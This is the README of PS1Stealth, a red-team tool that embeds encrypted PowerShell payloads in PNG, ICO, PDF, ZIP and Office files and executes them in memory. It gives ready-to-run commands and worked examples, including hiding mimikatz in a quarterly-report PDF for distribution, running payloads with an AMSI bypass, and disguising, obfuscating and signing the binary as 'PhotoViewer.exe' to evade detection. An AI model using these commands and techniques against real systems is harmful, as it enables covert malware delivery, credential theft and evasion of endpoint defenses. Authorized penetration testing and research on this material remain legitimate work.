# PS1Stealth - Advanced PowerShell Payload Embedding Tool

![Red Team](https://img.shields.io/badge/Red%20Team-Tool-red)
![.NET 8.0](https://img.shields.io/badge/.NET-8.0-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
![Developer](https://img.shields.io/badge/Developer-Krishnendu%20Paul-orange)


**PS1Stealth** is a comprehensive C# Red Teaming tool for embedding PowerShell scripts into various file formats using polyglot techniques, steganography, and binary manipulation. Inspired by the [beheader](https://github.com/p2r3/beheader) polyglot generator.

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is intended for:
- Authorized penetration testing
- Red team exercises
- Security research
- Educational purposes

Unauthorized use against systems you don't own or have explicit permission to test is illegal. The authors are not responsible for misuse.

## 🎯 Features

### Multiple Embedding Methods

1. **ImageLSB** - Least Significant Bit Steganography
   - Hides payload in image pixels
   - Visually imperceptible
   - Works with PNG/BMP
   - ~1 byte per 8 pixels capacity

2. **ImagePolyglot** - ICO Polyglot Files
   - Creates valid ICO files with hidden payload
   - Inspired by beheader's technique
   - High capacity

3. **PdfPolyglot** - PDF Stream Injection
   - Embeds payload in PDF stream objects
   - Maintains valid PDF structure
   - Medium capacity

4. **ZipComment** - ZIP Comment Field
   - Works with ZIP, JAR, APK, DOCX, XLSX
   - Low to medium capacity
   - Simple and effective

5. **IcoAtom** - ICO Header Manipulation
   - Uses ICO reserved bytes and padding
   - Similar to MP4 atom technique
   - Variable capacity

### Security Features

- **AES-256 Encryption** - Strong payload encryption
- **PBKDF2 Key Derivation** - 100,000 iterations with SHA-256
- **GZip Compression** - Reduces payload size
- **In-Memory Execution** - No disk writes during execution
- **AMSI Bypass** - Optional AMSI evasion (educational)

## 📦 Installation

### Prerequisites

- .NET 8.0 SDK or later
- Windows OS
- PowerShell 5.1 or later

### Build from Source

```powershell
# Clone or download the repository
cd PS1Stealth

# Restore dependencies
dotnet restore

# Build release version
dotnet build -c Release

# Publish as single executable
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

The executable will be in `bin/Release/net8.0-windows/win-x64/publish/PhotoViewer.exe`

## 🚀 Usage

### Basic Commands

```powershell
# Display help
PS1Stealth.exe --help

# Show embedding methods info
PS1Stealth.exe info
```

### Standalone Extraction (Recommended)

For extraction on target machines, use the C#-less PowerShell script `Extract.ps1`. This "living off the land" approach avoids dropping compiled binaries.

```powershell
# Extract to file
.\Extract.ps1 -InputFile "3_embedded.mp4" -Password "Secret123!" -OutputFile "payload.ps1"

# Execute in-memory
.\Extract.ps1 -InputFile "5_embedded.pdf" -Password "Secret123!" -Execute
```

**Supported Formats for Extract.ps1:**
- MP4 (Mp4Atom)
- PDF (PdfPolyglot)
- ZIP/Office (ZipComment)
- ICO (Polyglot/Atom)
- *Note: ImageLSB is not supported by the standalone script.*

### Embedding a Script

```powershell
# Basic embedding (ImageLSB)
PS1Stealth.exe embed script.ps1 photo.png output.png --method ImageLSB

# With encryption
PS1Stealth.exe embed script.ps1 photo.png output.png --method ImageLSB --password MySecret123

# With compression disabled
PS1Stealth.exe embed script.ps1 photo.png output.png --method ImageLSB --compress false

# PDF polyglot
PS1Stealth.exe embed script.ps1 document.pdf output.pdf --method PdfPolyglot --password Secret

# ZIP comment (works with DOCX, XLSX, etc.)
PS1Stealth.exe embed script.ps1 document.docx output.docx --method ZipComment --password Secret
```

### Extracting a Script

```powershell
# Extract from polyglot file
PS1Stealth.exe extract output.png extracted.ps1 --method ImageLSB --password MySecret123

# Extract from PDF
PS1Stealth.exe extract output.pdf extracted.ps1 --method PdfPolyglot --password Secret
```

### Executing In-Memory

```powershell
# Execute directly from polyglot file (no disk writes)
PS1Stealth.exe execute output.png --method ImageLSB --password MySecret123

# With AMSI bypass attempt
PS1Stealth.exe execute output.png --method ImageLSB --password MySecret123 --bypass-amsi
```

## 📋 Examples

### Example 1: Hide Reconnaissance Script in Company Logo

```powershell
# Create a recon script
@"
Get-NetIPConfiguration
Get-Process
whoami /all
"@ | Out-File recon.ps1

# Embed in company logo
PS1Stealth.exe embed recon.ps1 company_logo.png logo_modified.png --method ImageLSB --password CompanySecret2024

# Execute on target
PS1Stealth.exe execute logo_modified.png --method ImageLSB --password CompanySecret2024
```

### Example 2: Payload in PDF Report

```powershell
# Embed credential dumper in quarterly report
PS1Stealth.exe embed mimikatz.ps1 Q4_Report.pdf Q4_Report_Final.pdf --method PdfPolyglot --password Q4Budget

# Distribute the "legitimate" PDF
# Later execute from the PDF
PS1Stealth.exe execute Q4_Report_Final.pdf --method PdfPolyglot --password Q4Budget --bypass-amsi
```

### Example 3: Office Document Payload

```powershell
# Hide payload in Excel spreadsheet
PS1Stealth.exe embed payload.ps1 Financial_Data.xlsx Financial_Data_Updated.xlsx --method ZipComment --password Finance2024

# File remains a valid Excel document
# Extract and execute when needed
PS1Stealth.exe execute Financial_Data_Updated.xlsx --method ZipComment --password Finance2024
```

## 🏗️ Architecture

```
PS1Stealth/
├── Core/
│   ├── IEmbedder.cs          # Embedder interface
│   ├── PayloadData.cs        # Data models
│   ├── CryptoHelper.cs       # AES-256 encryption & compression
│   └── BinaryHelper.cs       # Binary manipulation utilities
├── Embedders/
│   ├── ImageLSBEmbedder.cs   # LSB steganography
│   ├── ImagePolyglotEmbedder.cs  # ICO polyglot
│   ├── PdfPolyglotEmbedder.cs    # PDF injection
│   ├── ZipCommentEmbedder.cs     # ZIP comment
│   └── IcoAtomEmbedder.cs        # ICO atom manipulation
├── Executors/
│   └── PowerShellExecutor.cs # In-memory PS execution
└── Program.cs                # CLI interface
```

## 🔬 Technical Details

### Polyglot Technique

Inspired by [beheader](https://github.com/p2r3/beheader), PS1Stealth creates files that are valid in multiple formats simultaneously. The key concepts:

1. **Format Tolerance** - Different parsers ignore different parts of files
2. **Strategic Placement** - Payload placed where primary parser ignores it
3. **Header Manipulation** - Careful manipulation of file headers
4. **Offset Adjustment** - Updating offsets when necessary

### Encryption

- **Algorithm**: AES-256-CBC
- **Key Derivation**: PBKDF2-HMAC-SHA256 (100,000 iterations)
- **Salt**: 32 random bytes per payload
- **IV**: 16 random bytes per payload

### Payload Format

```
[Magic: "PS1X" (4 bytes)]
[Length: int32 (4 bytes)]
[Flags: byte (1 byte)]
  - Bit 0: Compressed
  - Bit 1: Encrypted
[Reserved: 3 bytes]
[Payload Data: variable]
```

## 🛡️ Detection Evasion

### Current Techniques

1. **In-Memory Execution** - No .ps1 files written to disk
2. **Encryption** - AES-256 encrypted payloads
3. **Compression** - Obfuscates payload patterns
4. **Polyglot Files** - Legitimate file format carriers
5. **AMSI Bypass** - Optional AMSI evasion

### Limitations

- **Signature Detection**: Known AMSI bypass may be detected
- **Behavioral Analysis**: EDR may detect execution patterns
- **Network Monitoring**: C2 communication still detectable
- **Memory Scanning**: In-memory payloads can be scanned

## 🔧 Advanced Usage

### Custom Embedding

You can create custom embedders by implementing `IEmbedder`:

```csharp
public class CustomEmbedder : IEmbedder
{
    public async Task<byte[]> EmbedAsync(byte[] carrierData, PayloadData payload)
    {
        // Your embedding logic
    }

    public async Task<string> ExtractAsync(byte[] polyglotData, string? password = null)
    {
        // Your extraction logic
    }
}
```

### Programmatic Usage

```csharp
using PS1Stealth.Core;
using PS1Stealth.Embedders;

var embedder = new ImageLSBEmbedder();
var payload = new PayloadData
{
    ScriptContent = "Write-Host 'Hello from hidden script!'",
    Password = "MyPassword",
    UseCompression = true
};

var carrierData = await File.ReadAllBytesAsync("image.png");
var polyglot = await embedder.EmbedAsync(carrierData, payload);
await File.WriteAllBytesAsync("output.png", polyglot);
```

## 📊 Comparison with Beheader

| Feature | Beheader | PS1Stealth |
|---------|----------|------------|
| Language | JavaScript (Bun) | C# (.NET) |
| Platform | Linux | Windows |
| Target Format | Media files | PowerShell scripts |
| Formats | ICO+MP4+HTML+PDF+ZIP | PNG+ICO+PDF+ZIP+DOCX |
| Encryption | No | AES-256 |
| Execution | No | In-memory PowerShell |
| Dependencies | ffmpeg, ImageMagick, mp4edit | None (.NET only) |
| Use Case | Media polyglots | Red Team operations |

## 🎓 Educational Resources

### Understanding Polyglot Files

- [PoC||GTFO](https://www.alchemistowl.org/pocorgtfo/) - The bible of polyglot files
- [Beheader](https://github.com/p2r3/beheader) - JavaScript polyglot generator
- [Corkami Posters](https://github.com/corkami/pics) - File format visualizations

### PowerShell Security

- [PowerShell Obfuscation](https://www.danielbohannon.com/blog-1/2017/3/5/powershell-obfuscation-bible)
- [AMSI Bypass Techniques](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification_part_1/)

## ⚙️ Building for Production

### Obfuscation

Consider using:
- **ConfuserEx** - .NET obfuscator
- **.NET Reactor** - Commercial obfuscator
- **Eazfuscator.NET** - Code protection

### Code Signing

```powershell
# Sign the executable (requires code signing certificate)
signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com PhotoViewer.exe
```

### Single File Deployment

```powershell
dotnet publish -c Release -r win-x64 --self-contained true `
  -p:PublishSingleFile=true `
  -p:IncludeNativeLibrariesForSelfExtract=true `
  -p:EnableCompressionInSingleFile=true
```

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📝 License

This project is licensed under the MIT License for educational and authorized testing purposes only.

## 🙏 Credits

- Inspired by [beheader](https://github.com/p2r3/beheader) by p2r3
- AMSI bypass techniques from public research
- File format specifications from various open sources

## 👨‍💻 Developer

**Krishnendu Paul**
- 🌐 Website: [https://krishnendu.com](https://krishnendu.com)
- 🐙 GitHub: [https://github.com/bidhata/PS1Stealth](https://github.com/bidhata/PS1Stealth)

## 📧 Contact

**Use responsibly and only on systems you own or have explicit permission to test.**


---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.
